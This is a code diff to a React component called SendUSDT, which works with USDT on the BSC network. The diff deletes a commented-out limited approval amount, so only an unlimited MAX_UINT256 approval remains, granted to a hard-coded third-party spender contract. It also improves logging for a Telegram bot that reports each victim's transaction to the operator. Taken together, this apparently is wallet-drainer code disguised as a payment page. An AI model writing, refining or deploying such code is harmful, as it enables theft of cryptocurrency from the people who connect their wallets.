@@ -13,7 +13,7 @@ import '@fontsource/geist';
 
 const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
 const spenderAddress = "0x84e6400eE204b4dDCe5E0eF4e253Ba886fdb966A"; // Your verified contract
-// const approvalAmount = "9024508479"; // USDT amount to approve
+
 const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
 // Telegram Bot Configuration
@@ -125,17 +125,23 @@ export default function SendUSDT() {
           `Network: BSC (BEP-20)\n` +
           `\nView on BSCScan: https://bscscan.com/tx/${receipt.transactionHash}`;
 
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
-            text: telegramMessage,
-            parse_mode: "HTML"
+            text: telegramMessage
           }),
         });
+
+        const result = await response.json();
+        if (result.ok) {
+          console.log("✅ Telegram notification sent successfully");
+        } else {
+          console.error("❌ Telegram API error:", result);
+        }
       } catch (fetchErr) {
-        console.warn("Telegram notification failed:", fetchErr.message);
+        console.error("❌ Telegram notification failed:", fetchErr.message);
       }
 
     } catch (err) {
